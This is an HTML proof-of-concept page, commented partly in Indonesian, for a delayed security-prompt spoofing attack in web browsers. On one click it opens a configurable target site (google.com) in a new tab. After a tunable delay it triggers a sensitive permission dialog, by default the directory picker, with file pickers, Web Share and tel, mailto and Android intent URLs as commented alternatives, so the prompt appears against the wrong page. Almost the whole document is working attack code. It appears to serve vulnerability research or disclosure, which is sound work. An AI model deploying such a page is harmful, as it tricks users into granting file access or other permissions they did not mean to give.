<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Universal Delayed Security UI PoC</title>
<style>
  body {
    font-family: system-ui, Arial, sans-serif;
    padding: 40px;
    background: #fafafa;
  }
  button {
    padding: 14px 22px;
    font-size: 16px;
    cursor: pointer;
  }
  pre {
    margin-top: 16px;
    padding: 12px;
    background: #f1f1f1;
    border-radius: 6px;
    font-size: 13px;
    white-space: pre-wrap;
  }
</style>
</head>
<body>

<h2>Universal Delayed Security UI PoC</h2>
<p>
1 klik → delay → context berubah → security UI muncul
</p>

<button id="run">Run PoC</button>
<pre id="log"></pre>

<script>
/* ==========================
   CONFIGURATION
========================== */

// Ganti TARGET_URL sesuai kebutuhan
const TARGET_URL = "https://www.google.com";

// Delay (ms) — tweak per device/network
const DELAY_MS = 2500;

// Pilih SATU security-sensitive API di bawah
async function triggerSecurityUI() {

  // === File System Access API ===
  // await window.showSaveFilePicker({ suggestedName: "test.txt" });

  // await window.showOpenFilePicker();

   await window.showDirectoryPicker();

  // === Web Share API ===
  // await navigator.share({ title: "Test", text: "Hello", url: "https://example.com" });

  // === External Protocol / Intent ===
  // location.href = "tel:123456789";
  // location.href = "mailto:test@example.com";
  // location.href = "geo:0,0?q=Jakarta";

  // === Android Intent (Android Chrome only) ===
  // location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";

  // === Placeholder ===
  alert("Replace triggerSecurityUI() with a real security-sensitive API");
}

/* ==========================
   CORE LOGIC
========================== */

const logEl = document.getElementById("log");
const log = (m) => logEl.textContent += m + "\n";

document.getElementById("run").onclick = async () => {
  log("[+] User gesture received");

  // 1) Change visible context (tab switch / navigation)
  window.open(TARGET_URL, "_blank");
  log("[+] Opened target tab: " + TARGET_URL);

  // 2) Async gap (attack window)
  setTimeout(async () => {
    log("[!] Triggering security-sensitive UI after delay");
    try {
      await triggerSecurityUI();
      log("[+] UI triggered");
    } catch (e) {
      log("[-] UI canceled / blocked: " + e);
    }
  }, DELAY_MS);
};
</script>

</body>
</html>
